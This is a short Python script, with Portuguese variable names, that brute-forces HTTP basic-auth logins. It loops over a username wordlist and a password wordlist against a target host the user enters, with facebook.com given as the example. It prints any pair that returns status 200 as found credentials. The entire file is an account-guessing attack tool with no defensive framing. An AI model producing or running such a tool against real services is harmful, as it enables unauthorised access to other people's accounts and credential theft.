import requests


usuarios = open(input('Users Wordlist: '))
wl_senhas = input('Pass Wordlist: ')
alvo = input('(Ex: http://www.facebook.com) host: ')

for usuario in usuarios:
    senhas = open(wl_senhas)
    for senha in senhas:
        usuario = usuario.rstrip()
        senha = senha.rstrip()
        print('Trying ', usuario, 'with ', senha)
        login = requests.get(alvo, auth=(usuario, senha))
        if login.status_code == 200:
            print('''
    Found!
    User: {user}
    Pass:   {senha}'''.format(user=usuario, senha=senha))
        if login.status_code == 404:
            print("404 error")